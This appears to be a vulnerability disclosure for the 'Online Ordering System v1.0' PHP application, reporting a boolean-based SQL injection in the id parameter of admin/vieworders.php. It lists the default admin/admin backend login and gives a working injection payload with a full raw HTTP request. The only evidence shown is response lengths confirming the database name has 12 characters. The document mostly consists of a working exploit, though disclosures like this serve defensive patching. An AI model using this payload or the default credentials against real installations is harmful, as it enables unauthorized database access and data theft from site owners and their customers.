# Online Ordering System v1.0 by oretnom23 has SQL injection

Author： k0xx

The password for the backend login account is: admin/admin

vendors: https://www.sourcecodester.com/php/5125/online-ordering-system-using-phpmysql.html

Vulnerability File: /onlineordering/admin/vieworders.php

Vulnerability location: /onlineordering/admin/vieworders.php?id=,id

[+] Payload: /onlineordering/admin/vieworders.php?id=MM-MDE%27%20and%20length(database())%20=12--+ // Leak place ---> id

Current database name: shoppingcart,length is 12

```sql
GET /onlineordering/admin/vieworders.php?id=MM-MDE%27%20and%20length(database())%20=12--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=v112m4jpgqqtdo86av7lvbjv3l
Connection: close
```

When length (database (()) = 11, Content-Length: 791

![image](https://user-images.githubusercontent.com/54017627/167338888-8403956f-5275-4aa9-b7ed-0885da04056f.png)

![image](https://user-images.githubusercontent.com/54017627/167338924-354859b5-b241-42fb-aed8-be9aefd77dd9.png)

When length (database (()) = 12, Content-Length: 1065

![image](https://user-images.githubusercontent.com/54017627/167338863-4fdef729-dddf-4c18-a271-815f934101fd.png)

![image](https://user-images.githubusercontent.com/54017627/167338906-23ff6bc6-d928-49d1-b8b6-0a51a6f2ddf7.png)
